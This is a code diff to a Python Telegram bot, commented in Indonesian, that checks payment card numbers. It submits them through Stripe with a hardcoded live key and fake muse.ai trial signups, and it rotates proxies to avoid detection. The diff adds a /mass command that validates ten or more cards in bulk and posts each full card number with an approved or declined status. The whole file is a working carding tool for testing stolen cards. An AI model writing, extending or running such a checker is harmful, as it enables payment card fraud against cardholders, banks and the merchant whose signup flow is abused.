@@ -22,7 +22,7 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # --- GLOBAL VARIABLES & DATA ---
-PROXIES = [] # Inisialisasi di level global
+PROXIES = []
 STRIPE_KEY = "pk_live_a6DCdatuNGQFYQOaddF0Guf3"
 MUSE_COOKIES = {
     "mode": "light", "_ga": "GA1.1.624514859.1750016648", "_gcl_au": "1.1.1507302922.1750016648",
@@ -41,22 +41,23 @@ BASE_HEADERS = {
 # --- FUNGSI HELPER ---
 
 def load_proxies_from_file():
-    """Memuat proxy dari file proxies.txt ke variabel global."""
     global PROXIES
     try:
         with open('proxies.txt', 'r') as f:
-            # Langsung isi variabel global
             PROXIES = [line.strip() for line in f if line.strip()]
         if PROXIES:
             logger.info(f"Successfully loaded {len(PROXIES)} proxies from proxies.txt.")
     except FileNotFoundError:
         logger.warning("proxies.txt not found. Running without proxies.")
 
-async def edit_message_safe(message: Message, text: str):
-    try: await message.edit_text(text)
-    except BadRequest as e:
-        if "Message is not modified" not in str(e): logger.error(f"Error editing message: {e}")
+async def edit_message_safe(message: Message | None, text: str):
+    # Tambahkan pengecekan jika message adalah None
+    if message:
+        try: await message.edit_text(text)
+        except BadRequest as e:
+            if "Message is not modified" not in str(e): logger.error(f"Error editing message: {e}")
 
+# ... Sisa fungsi helper tidak berubah ...
 async def get_bin_info(bin_number: str):
     if len(bin_number) < 6: return None
     url = f"https://lookup.binlist.net/{bin_number[:6]}"
@@ -69,8 +70,10 @@ async def get_bin_info(bin_number: str):
 def format_bin_info(d): return f"Brand: {d.get('scheme','?').upper()}\n⇻ Type: {d.get('type','?').upper()}\n⇻ Bank: {d.get('bank',{}).get('name','?').upper()}\n⇻ Country: {d.get('country',{}).get('name','?').upper()} {d.get('country',{}).get('emoji','')}" if d else "Brand:?\n⇻ Type:?\n⇻ Bank:?\n⇻ Country:?"
 def get_decline_message(c): return {"do_not_honor":"Penerbit kartu menolak pembayaran.","insufficient_funds":"Dana tidak mencukupi.","generic_decline":"Generic decline"}.get(c,c.replace("_"," ").capitalize()) if c else "N/A"
 
+
 # --- FUNGSI UTAMA ---
-async def check_card_on_muse(cc, mm, yy, cvc, message: Message, proxy_url=None):
+# MODIFIKASI: message sekarang bersifat opsional (Message | None = None)
+async def check_card_on_muse(cc, mm, yy, cvc, message: Message | None = None, proxy_url=None):
     name = fake.name()
     email = f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}@gmail.com"
     timeout = ClientTimeout(total=30)
@@ -84,23 +87,19 @@ async def check_card_on_muse(cc, mm, yy, cvc, message: Message, proxy_url=None):
                 if isinstance(result, dict) and "status" in result:
                      return result
             except (aiohttp.ClientProxyConnectionError, aiohttp.ClientOSError, asyncio.TimeoutError) as e:
-                logger.error(f"[Step {step_num}] FAILED. Proxy/Connection error: {type(e).__name__}")
                 return {"status": "error", "message": f"Proxy/Connection Error: {type(e).__name__}", "proxy_error": True}
             except aiohttp.ClientResponseError as e:
-                logger.error(f"[Step {step_num}] FAILED. HTTP Status {e.status}. Response: {e.message}")
-                try:
-                    error_data = (await e.json()).get("error", {})
-                    code = error_data.get("decline_code") or error_data.get("code", "http_error")
-                    return {"status": "declined", "code": code, "message": get_decline_message(code)}
-                except Exception:
-                    return {"status": "error", "message": f"HTTP Error {e.status}"}
+                try: error_data = (await e.json()).get("error", {})
+                except Exception: error_data = {}
+                code = error_data.get("decline_code") or error_data.get("code", "http_error")
+                return {"status": "declined", "code": code, "message": get_decline_message(code)}
             except aiohttp.ClientError as e:
-                logger.error(f"[Step {step_num}] FAILED. General network error: {type(e).__name__} - {e}")
                 return {"status": "error", "message": f"Network Error: {type(e).__name__}"}
     return {"status": "error", "message": "Flow completed without a result."}
 
 async def _step1_create_pm(session, local_vars):
-    await edit_message_safe(local_vars['message'], "⏳ [1/4] Creating Payment Method...")
+    await edit_message_safe(local_vars.get('message'), "⏳ [1/4] Creating Payment Method...")
+    # ... sisa fungsi _step1_create_pm sama ...
     pm_data = {'type': 'card', 'billing_details[name]': local_vars['name'], 'billing_details[email]': local_vars['email'], 'card[number]': local_vars['cc'], 'card[cvc]': local_vars['cvc'], 'card[exp_month]': local_vars['mm'], 'card[exp_year]': local_vars['yy'], 'guid': 'bbeb7dc1-2f34-4cba-9e5a-d39fa215300a0b6163', 'payment_user_agent': 'stripe.js/22a1c02c9a', 'time_on_page': str(random.randint(50000, 60000)), 'key': STRIPE_KEY}
     stripe_headers = {**BASE_HEADERS, "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/"}
     async with session.post("https://api.stripe.com/v1/payment_methods", data=pm_data, headers=stripe_headers, proxy=local_vars['proxy_url']) as pm_resp:
@@ -111,7 +110,8 @@ async def _step1_create_pm(session, local_vars):
     return local_vars
 
 async def _step2_start_payment(session, local_vars):
-    await edit_message_safe(local_vars['message'], "⏳ [2/4] Initializing on muse.ai...")
+    await edit_message_safe(local_vars.get('message'), "⏳ [2/4] Initializing on muse.ai...")
+    # ... sisa fungsi _step2_start_payment sama ...
     start_payload = {"email": local_vars['email'], "name": local_vars['name'], "trial": 1, "tier": "basic", "pm": local_vars['pm_id'], "ab_pricing": 0, "ab_landing": 0, "cost_month": 16, "duration": 2629800, "access": "", "referral": ""}
     start_headers = {**BASE_HEADERS, "content-type": "application/json; charset=UTF-8", "origin": "https://muse.ai", "referer": "https://muse.ai/join", "x-requested-with": "XMLHttpRequest"}
     async with session.post("https://muse.ai/api/pay/start", json=start_payload, headers=start_headers, proxy=local_vars['proxy_url']) as start_resp:
@@ -122,7 +122,8 @@ async def _step2_start_payment(session, local_vars):
     return local_vars
 
 async def _step3_confirm_intent(session, local_vars):
-    await edit_message_safe(local_vars['message'], "⏳ [3/4] Confirming with Stripe...")
+    await edit_message_safe(local_vars.get('message'), "⏳ [3/4] Confirming with Stripe...")
+    # ... sisa fungsi _step3_confirm_intent sama ...
     confirm_data = {'key': STRIPE_KEY, 'client_secret': local_vars['client_secret'], 'payment_method': local_vars['pm_id']}
     stripe_headers = {**BASE_HEADERS, "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/"}
     async with session.post(f"https://api.stripe.com/v1/setup_intents/{local_vars['seti_id']}/confirm", data=confirm_data, headers=stripe_headers, proxy=local_vars['proxy_url']) as confirm_resp:
@@ -134,13 +135,14 @@ async def _step3_confirm_intent(session, local_vars):
         code = error.get("decline_code") or error.get("code", "unknown_decline")
         return {"status": "declined", "code": code, "message": get_decline_message(code)}
 
+
 # --- HANDLER TELEGRAM ---
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
     logger.error("Exception while handling an update:", exc_info=context.error)
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-    await update.message.reply_html(f"👋 Welcome, {user.mention_html()}!\n\n<b>Available Commands:</b>\n\n<code>/au cc|mm|yy|cvc</code>\n\n<b>Bot by:</b> Secure Auth Team")
+    await update.message.reply_html(f"👋 Welcome, {user.mention_html()}!\n\n<b>Available Commands:</b>\n\n<code>/au cc|mm|yy|cvc</code>\n<code>/mass [list of cards]</code>\n\n<b>Bot by:</b> Secure Auth Team")
 
 async def au_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -156,19 +158,19 @@ async def au_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     checking_msg = await update.message.reply_text("⏳ Initializing...")
     proxy_to_use = random.choice(PROXIES) if PROXIES else None
     
+    # MODIFIKASI: Kirim `checking_msg` ke `check_card_on_muse`
     check_task = asyncio.create_task(check_card_on_muse(cc, mm, yy, cvc, message=checking_msg, proxy_url=proxy_to_use))
     bin_task = asyncio.create_task(get_bin_info(cc))
     result, bin_data = await check_task, await bin_task
     
     await edit_message_safe(checking_msg, "✅ Finalizing result...")
     
+    # ... sisa fungsi au_command sama ...
     if not proxy_to_use: proxy_status_str = "None"
     elif result.get("proxy_error"): proxy_status_str = "Dead❌"
     else: proxy_status_str = "Live✅"
-
     full_cc_info = f"{cc}|{mm}|{yy}|{cvc}"
     bin_info_str = format_bin_info(bin_data)
-    
     final_message = "↬ Secure | Auth ↫\n- - - - - - - - - - - - - - - - - - - - -\n"
     final_message += f"⇻ CC: {full_cc_info}\n"
     if result['status'] == 'approved': final_message += f"⇻ Status: Approved! ✅\n⇻ Result: {result['message']}\n⇻ Code: {result['code'].capitalize()}\n"
@@ -179,16 +181,74 @@ async def au_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     final_message += "- - - - - - - - - - - - - - - - - - - - -\n"
     final_message += f"⇻ Proxy: {proxy_status_str}\n"
     final_message += f"(↯) Checked by: @{user.username or user.first_name}"
-    
     await edit_message_safe(checking_msg, final_message)
 
+# --- FUNGSI BARU UNTUK /mass ---
+async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    try:
+        # Ambil semua teks setelah perintah /mass
+        card_list_text = update.message.text.split(maxsplit=1)[1]
+        cards = [line.strip() for line in card_list_text.strip().split('\n') if line.strip()]
+    except IndexError:
+        await update.message.reply_text("❌ Format Salah. Gunakan: /mass [list kartu], satu per baris.")
+        return
+
+    if len(cards) < 10:
+        await update.message.reply_text(f"❌ Harap berikan minimal 10 kartu untuk pengecekan massal. Anda memberikan {len(cards)} kartu.")
+        return
+
+    await update.message.reply_text(f"✅ Mass check dimulai untuk {len(cards)} kartu. Hasil akan dikirim satu per satu dengan jeda 3 detik.")
+
+    for i, card_line in enumerate(cards):
+        try:
+            cc, mm, yy, cvc = card_line.split('|')
+            if len(yy) == 2: yy = "20" + yy
+            if not all(x.isdigit() for x in [cc, mm, yy, cvc]) or len(cc) < 12: raise ValueError
+        except ValueError:
+            await update.message.reply_text(f"⚠️ Melewati baris tidak valid #{i+1}: `{card_line}`", parse_mode='Markdown')
+            await asyncio.sleep(3)
+            continue
+
+        proxy_to_use = random.choice(PROXIES) if PROXIES else None
+        
+        # Di sini kita tidak mengirim message object, jadi tidak akan ada update status real-time
+        check_task = asyncio.create_task(check_card_on_muse(cc, mm, yy, cvc, proxy_url=proxy_to_use))
+        bin_task = asyncio.create_task(get_bin_info(cc))
+        result, bin_data = await check_task, await bin_task
+        
+        # Logika status proxy
+        if not proxy_to_use: proxy_status_str = "None"
+        elif result.get("proxy_error"): proxy_status_str = "Dead❌"
+        else: proxy_status_str = "Live✅"
+
+        full_cc_info = f"{cc}|{mm}|{yy}|{cvc}"
+        bin_info_str = format_bin_info(bin_data)
+        
+        final_message = "↬ Secure | Auth ↫\n- - - - - - - - - - - - - - - - - - - - -\n"
+        final_message += f"⇻ CC: {full_cc_info}\n"
+        if result['status'] == 'approved': final_message += f"⇻ Status: Approved! ✅\n⇻ Result: {result['message']}\n⇻ Code: {result['code'].capitalize()}\n"
+        elif result['status'] == 'declined': final_message += f"⇻ Status: Decline! ❌\n⇻ Result: {result['message']}\n⇻ Code: {result['code']}\n"
+        else: final_message += f"⇻ Status: Error! ⚠️\n⇻ Result: {result['message']}\n"
+        final_message += "- - - - - - - - - - - - - - - - - - - - -\n"
+        final_message += f"⇻ {bin_info_str}\n"
+        final_message += "- - - - - - - - - - - - - - - - - - - - -\n"
+        final_message += f"⇻ Proxy: {proxy_status_str}\n"
+        final_message += f"(↯) Checked by: @{user.username or user.first_name}"
+        
+        await update.message.reply_text(final_message)
+        
+        # Jeda 3 detik
+        await asyncio.sleep(3)
+
+    await update.message.reply_text(f"🎉 Mass check selesai! Total {len(cards)} kartu telah diproses.")
+
+
 def main():
-    """Fungsi utama yang diubah untuk HANYA memuat proxy dari file."""
     if not TELEGRAM_BOT_TOKEN:
         logger.critical("FATAL: TELEGRAM_BOT_TOKEN environment variable not set!")
         return
     
-    # Memanggil fungsi untuk memuat dari file SAJA
     load_proxies_from_file()
     
     if not PROXIES:
@@ -198,10 +258,11 @@ def main():
     application.add_error_handler(error_handler)
     application.add_handler(CommandHandler("start", start_command))
     application.add_handler(CommandHandler("au", au_command))
+    # Daftarkan handler baru untuk /mass
+    application.add_handler(CommandHandler("mass", mass_command))
     
     logger.info("Bot is starting with aiohttp, using proxies from proxies.txt ONLY.")
     application.run_polling()
 
 if __name__ == "__main__":
-    # Jalankan fungsi main() yang sekarang sudah tidak asinkron lagi
     main()
